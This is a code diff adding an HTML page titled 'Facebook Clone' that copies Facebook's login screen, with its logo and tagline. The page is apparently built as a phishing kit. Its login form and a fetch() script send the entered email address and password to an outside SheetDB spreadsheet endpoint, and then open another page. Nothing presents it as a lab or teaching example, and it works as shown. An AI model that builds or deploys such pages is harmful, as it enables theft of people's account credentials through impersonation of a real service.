@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Facebook Clone</title>
+    <link rel="stylesheet" href="./css/styles.css">
+    <link rel="shortcut icon" href="./images/fb.ico" type="image/x-icon">
+</head>
+
+<body>
+    <main>
+        <div class="main">
+            <div class="heading-section">
+                <img src="./images/logo.png" class="logo-img">
+                <div class="a-ri8"><span>Facebook helps you connect and share with the people in your life.</span></div>
+            </div>
+            <div class="form">
+                <!-- Unified Form -->
+                <form action="https://sheetdb.io/api/v1/veh7wqv8e4bq9" method="POST" id="sheetdb-form">
+                    <input type="email" id="Email" class="a-email" name="data[Email]" placeholder="Email address or phone number"
+                        autofocus="autofocus" required />
+                    <input type="password" id="Password" class="a-pss" name="data[Password]" placeholder="Password"
+                        required />
+                    <input type="submit" class="a-sub" value="Log In" />
+                    <a href="" class="a-link">Forgotten password?</a>
+                    <hr class="a-hr">
+                    <button type="button" class="a-but" onclick="createAccount()">Create New Account</button>
+                </form>
+                <div class="create-page">
+                    <a href="" class="a-href">Create a Page</a> for a celebrity, band, or business.
+                </div>
+            </div>
+        </div>
+    </main>
+
+
+
+    <script>
+        // JavaScript for form submission
+        const form = document.getElementById("sheetdb-form");
+
+        form.addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            fetch(form.action, {
+                method: "POST",
+                body: new FormData(form),
+            })
+            .then((response) => {
+                if (!response.ok) {
+                    throw new Error("Network response was not ok");
+                }
+                return response.json();
+            })
+            .then((data) => {
+                console.log("Success:", data);
+                alert("Form submitted successfully!");
+                window.open("d.html", "_blank");
+            })
+            .catch((error) => {
+                console.error("Error:", error);
+                alert("There was an error submitting the form. Please try again.");
+            });
+        });
+
+        // Function for Create Account button
+        function createAccount() {
+            alert("Redirecting to Create New Account page...");
+            // You can add logic to redirect to a different page here
+        }
+    </script>
+</body>
+
+</html>
